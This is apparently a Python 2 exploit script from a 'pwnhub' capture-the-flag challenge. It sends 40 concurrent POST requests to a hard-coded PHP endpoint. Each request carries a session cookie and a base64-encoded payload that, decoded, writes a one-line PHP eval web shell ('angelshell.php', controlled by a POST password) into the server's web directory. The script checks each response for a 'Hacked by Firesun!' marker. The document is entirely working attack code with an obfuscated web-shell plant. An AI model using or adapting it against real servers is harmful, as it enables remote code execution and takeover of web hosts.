# -*- coding:utf-8 -*-

import requests

import gevent.pool
import gevent.monkey

url = "http://52.80.32.116/2d9bc625acb1ba5d0db6f8d0c8b9d206/a9b4d7cc810da015142f61f7e236d50b.php?pwnhub=firesun"

def go():
    pool = gevent.pool.Pool(20)
    pool.map(put_shell,[i for i in range(40)])



def put_shell(num):
    COOKIES = {"PHPSESSID":"8pk7eubo30kurme1k071eoi3g1"}

    data_eval = {
        "image": "http://******/pwnhub.png",
        "pwnhub": "ZmlsZV9wdXRfY29udGVudHMoJy92YXIvd3d3L2h0bWwvMmQ5YmM2MjVhY2IxYmE1ZDBkYjZmOGQwYzhiOWQyMDYvaW1hZ2UvYW5nZWxzaGVsbC5waHAnLCc8P3BocCBldmFsKFwkX1BPU1RbXCdjaG9wcGVyMTIzXCddKTs/PicpOw=="
    }

    r = requests.post(url, cookies=COOKIES,data=data_eval)
    print str(num) + '|' + r.text

    if "Hacked by Firesun!" in r.content :
        print r.content
        exit()

if __name__ == '__main__':
    gevent.monkey.patch_socket()
    go()